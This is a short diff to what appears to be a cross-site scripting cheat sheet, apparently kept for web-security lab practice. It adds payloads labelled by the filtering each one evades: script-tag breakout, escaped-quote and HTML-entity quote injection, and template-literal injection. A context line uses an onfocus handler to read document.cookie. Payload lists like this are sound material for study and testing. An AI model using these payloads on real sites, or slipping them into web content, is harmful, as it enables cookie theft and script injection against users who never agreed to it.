@@ -32,5 +32,18 @@ function handleResponse() {
 };
 </script>
 
-// custom tag
+// bypass by custom tag
 <xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x
+
+// bypass single quote and backslash escaped
+</script><script>alert(1)</script>
+
+// bypass angle brackets and double quotes HTML-encoded and single quotes escaped
+\'-alert(1)//
+
+// bypass angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+&apos;-alert(1)-&apos;
+
+// bypass angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+${alert(1)}
+
